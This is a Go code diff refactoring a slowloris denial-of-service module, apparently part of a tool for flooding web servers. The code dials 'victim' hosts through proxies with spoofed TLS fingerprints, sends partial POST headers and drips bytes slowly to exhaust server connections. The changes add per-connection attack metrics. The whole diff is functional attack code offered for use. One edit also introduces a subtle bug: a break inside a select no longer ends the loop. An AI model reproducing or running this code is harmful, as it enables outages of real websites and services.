@@ -4,12 +4,12 @@ package slowloris
 import (
 	"fmt"
 	"io"
-	"log"
 	"net"
 	"net/url"
 	"strings"
 	"time"
 
+	"github.com/google/uuid"
 	utls "github.com/refraction-networking/utls"
 	"go.uber.org/zap"
 
@@ -30,11 +30,6 @@ type Config struct {
 	Timeout          time.Duration
 }
 
-// SlowLoris is a main logic struct for the package
-type SlowLoris struct {
-	Config *Config
-}
-
 const sharedReadBufSize = 4096
 
 var (
@@ -43,16 +38,10 @@ var (
 )
 
 // Start starts a slowloris job with specific configuration
-func Start(stopChan chan bool, logger *zap.Logger, config *Config) error {
-	s := &SlowLoris{
-		Config: config,
-	}
-
+func Start(stopChan <-chan struct{}, config *Config, a *metrics.Accumulator, logger *zap.Logger) error {
 	targetURL, err := url.Parse(config.Path)
 	if err != nil {
-		logger.Debug("cannot parse path", zap.String("path", config.Path), zap.Error(err))
-
-		return err
+		return fmt.Errorf("error parsing path %q: %w", config.Path, err)
 	}
 
 	targetHostPort := targetURL.Host
@@ -72,14 +61,10 @@ func Start(stopChan chan bool, logger *zap.Logger, config *Config) error {
 
 	requestHeader := []byte(fmt.Sprintf("POST %s HTTP/1.1\nHost: %s\nContent-Type: application/x-www-form-urlencoded\nContent-Length: %d\n\n",
 		targetURL.RequestURI(), host, config.ContentLength))
-	dialWorkersLaunchInterval := config.RampUpInterval / time.Duration(config.DialWorkersCount)
-	activeConnectionsCh := make(chan int, config.DialWorkersCount)
-
-	go s.activeConnectionsCounter(activeConnectionsCh)
 
 	for i := 0; i < config.DialWorkersCount; i++ {
-		go s.dialWorker(stopChan, logger, config, activeConnectionsCh, targetHostPort, targetURL, requestHeader)
-		time.Sleep(dialWorkersLaunchInterval)
+		go dialWorker(stopChan, config, targetHostPort, targetURL, requestHeader, a.Clone(uuid.NewString()), logger)
+		time.Sleep(config.RampUpInterval / time.Duration(config.DialWorkersCount))
 	}
 
 	time.Sleep(config.Duration)
@@ -87,34 +72,22 @@ func Start(stopChan chan bool, logger *zap.Logger, config *Config) error {
 	return nil
 }
 
-func (s SlowLoris) dialWorker(stopChan chan bool, logger *zap.Logger, config *Config, activeConnectionsCh chan<- int,
-	targetHostPort string, targetURI *url.URL, requestHeader []byte,
+func dialWorker(stopChan <-chan struct{}, config *Config,
+	targetHostPort string, targetURI *url.URL, requestHeader []byte, a *metrics.Accumulator, logger *zap.Logger,
 ) {
-	isTLS := targetURI.Scheme == "https"
-
 	for {
 		select {
+		case <-time.After(config.RampUpInterval):
+			if conn := dialVictim(config, targetHostPort, targetURI.Scheme == "https", logger); conn != nil {
+				go doLoris(config, targetURI.Scheme, targetHostPort, conn, requestHeader, a.Clone(uuid.NewString()), logger)
+			}
 		case <-stopChan:
 			return
-		default:
-			time.Sleep(config.RampUpInterval)
-
-			if conn := s.dialVictim(logger, config, targetHostPort, isTLS); conn != nil {
-				go s.doLoris(logger, config, targetHostPort, conn, activeConnectionsCh, requestHeader)
-			}
 		}
 	}
 }
 
-func (s SlowLoris) activeConnectionsCounter(ch <-chan int) {
-	var connectionsCount int
-	for n := range ch {
-		connectionsCount += n
-		log.Printf("Holding %d connections", connectionsCount)
-	}
-}
-
-func (s SlowLoris) dialVictim(logger *zap.Logger, config *Config, hostPort string, isTLS bool) io.ReadWriteCloser {
+func dialVictim(config *Config, hostPort string, isTLS bool, logger *zap.Logger) io.ReadWriteCloser {
 	conn, err := utils.GetProxyFunc(config.ProxyURLs, config.Timeout, false)("tcp", hostPort)
 	if err != nil {
 		metrics.IncSlowLoris(hostPort, "tcp", metrics.StatusFail)
@@ -171,49 +144,56 @@ func (s SlowLoris) dialVictim(logger *zap.Logger, config *Config, hostPort strin
 	return tlsConn
 }
 
-func (s SlowLoris) doLoris(logger *zap.Logger, config *Config, destinationHostPort string, conn io.ReadWriteCloser,
-	activeConnectionsCh chan<- int, requestHeader []byte,
+func doLoris(config *Config, scheme, destinationHostPort string, conn io.ReadWriteCloser, requestHeader []byte,
+	a *metrics.Accumulator, logger *zap.Logger,
 ) {
 	defer conn.Close()
 
-	if _, err := conn.Write(requestHeader); err != nil {
+	target := scheme + "://" + destinationHostPort
+	headerLen, err := conn.Write(requestHeader)
+
+	a.AddStats(target, metrics.Stats{1, 0, 0, uint64(headerLen), 0})
+
+	if err != nil {
 		metrics.IncSlowLoris(destinationHostPort, "tcp", metrics.StatusFail)
 		logger.Debug("cannot write requestHeader", zap.ByteString("header", requestHeader), zap.Error(err))
 
 		return
 	}
 
-	activeConnectionsCh <- 1
-	defer func() { activeConnectionsCh <- -1 }()
-
 	readerStopCh := make(chan int, 1)
-	go s.nullReader(logger, conn, readerStopCh)
+	go nullReader(conn, readerStopCh, logger)
 
-	for i := 0; i < config.ContentLength; i++ {
+	var bytesSent int
+	for ; bytesSent < config.ContentLength; bytesSent++ {
 		select {
-		case <-readerStopCh:
-			return
 		case <-time.After(config.SleepInterval):
+		case bytesReceived := <-readerStopCh:
+			a.AddStats(target, metrics.Stats{0, 0, 1, 0, uint64(bytesReceived)})
+
+			break
 		}
 
 		if _, err := conn.Write(sharedWriteBuf); err != nil {
 			metrics.IncSlowLoris(destinationHostPort, "tcp", metrics.StatusFail)
-			logger.Debug("cannot write bytes", zap.Int("current", i), zap.Int("total", config.ContentLength), zap.Error(err))
+			logger.Debug("cannot write bytes", zap.Int("current", bytesSent), zap.Int("total", config.ContentLength), zap.Error(err))
 
-			return
+			break
 		}
 
 		metrics.IncSlowLoris(destinationHostPort, "tcp", metrics.StatusSuccess)
 	}
+
+	a.AddStats(target, metrics.Stats{0, 1, 0, uint64(bytesSent), 0})
 }
 
-func (s SlowLoris) nullReader(logger *zap.Logger, conn io.Reader, ch chan<- int) {
-	defer func() { ch <- 1 }()
-
+func nullReader(conn io.Reader, ch chan<- int, logger *zap.Logger) {
 	n, err := conn.Read(sharedReadBuf)
 	if err != nil {
 		logger.Debug("error when reading server response", zap.Error(err))
 	} else {
 		logger.Debug("unexpected response read from server", zap.ByteString("buffer", sharedReadBuf[:n]))
 	}
+
+	ch <- n
 }
